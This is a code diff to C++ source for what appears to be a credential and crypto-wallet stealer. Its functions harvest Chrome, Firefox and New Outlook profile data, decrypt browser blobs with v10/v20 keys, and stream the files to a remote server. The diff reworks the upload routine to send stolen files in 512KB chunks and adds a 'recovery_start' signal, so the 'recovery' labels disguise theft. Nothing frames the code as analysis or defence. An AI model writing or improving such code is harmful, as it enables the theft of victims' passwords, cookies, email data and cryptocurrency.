@@ -57,36 +57,47 @@ static std::vector<WalletMetadata> target_wallets = {
 void send_file_to_server(SOCKET sock, const std::string& relPath, const std::vector<uint8_t>& data) {
     if (sock == INVALID_SOCKET) return;
 
-    uint32_t pathLen = (uint32_t)relPath.size();
-    uint32_t dataSize = (uint32_t)data.size();
-    uint32_t totalSize = sizeof(uint32_t) + pathLen + dataSize;
+    const size_t CHUNK_SIZE = 512 * 1024; // 512KB chunks
+    size_t total_sent = 0;
+    size_t data_size = data.size();
 
-    PacketHeader header;
-    header.signature = PACKET_SIGNATURE;
-    header.type = PACKET_TYPE_RECOVERY_FILE;
-    header.size = totalSize;
+    do {
+        size_t current_chunk = (data_size - total_sent > CHUNK_SIZE) ? CHUNK_SIZE : (data_size - total_sent);
 
-    std::vector<uint8_t> packet;
-    packet.resize(sizeof(PacketHeader) + totalSize);
-    memcpy(packet.data(), &header, sizeof(PacketHeader));
+        uint32_t pathLen = (uint32_t)relPath.size();
+        uint32_t payloadSize = (uint32_t)current_chunk;
+        uint32_t totalSize = sizeof(uint32_t) + pathLen + payloadSize;
 
-    uint8_t* ptr = packet.data() + sizeof(PacketHeader);
-    memcpy(ptr, &pathLen, sizeof(uint32_t));
-    ptr += sizeof(uint32_t);
-    memcpy(ptr, relPath.c_str(), pathLen);
-    ptr += pathLen;
-    if (dataSize > 0) {
-        memcpy(ptr, data.data(), dataSize);
-    }
+        PacketHeader header;
+        header.signature = PACKET_SIGNATURE;
+        header.type = PACKET_TYPE_RECOVERY_FILE;
+        header.size = totalSize;
 
-    int remaining = (int)packet.size();
-    const char* p = (const char*)packet.data();
-    while (remaining > 0) {
-        int sent = send(sock, p, remaining, 0);
-        if (sent <= 0) break;
-        p += sent;
-        remaining -= sent;
-    }
+        std::vector<uint8_t> packet;
+        packet.resize(sizeof(PacketHeader) + totalSize);
+        memcpy(packet.data(), &header, sizeof(PacketHeader));
+
+        uint8_t* ptr = packet.data() + sizeof(PacketHeader);
+        memcpy(ptr, &pathLen, sizeof(uint32_t));
+        ptr += sizeof(uint32_t);
+        memcpy(ptr, relPath.c_str(), pathLen);
+        ptr += pathLen;
+
+        if (current_chunk > 0) {
+            memcpy(ptr, data.data() + total_sent, current_chunk);
+        }
+
+        int remaining = (int)packet.size();
+        const char* p = (const char*)packet.data();
+        while (remaining > 0) {
+            int sent = send(sock, p, remaining, 0);
+            if (sent <= 0) break;
+            p += sent;
+            remaining -= sent;
+        }
+
+        total_sent += current_chunk;
+    } while (total_sent < data_size);
 }
 
 void send_directory_recursively(SOCKET sock, const fs::path& source_dir, const std::string& server_path_prefix) {
@@ -216,6 +227,11 @@ void extract_firefox_wallets(SOCKET sock, const fs::path& profile_path, const st
 std::vector<uint8_t> decrypt_blob(const std::vector<uint8_t>& blob, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera);
 
 void run_recovery(SOCKET sock) {
+    if (sock != INVALID_SOCKET) {
+        std::string start_msg = "{\"action\":\"recovery_start\"}\r\n";
+        send(sock, start_msg.c_str(), (int)start_msg.size(), 0);
+    }
+
     std::vector<BrowserConfig> configs = {
         {"New Outlook", "", {}, "", {L"Microsoft", L"Olk", L"EBWebView"}, "mail_clients/Outlook", "outlook_tmp", false, false, false, false},
         {"Google Chrome", "chrome.exe", {L"Google\\Chrome\\Application\\chrome.exe"}, "chrome.dll", {L"Google", L"Chrome", L"User Data"}, "browsers/Google Chrome", "chrome_tmp", false, false, true, false},
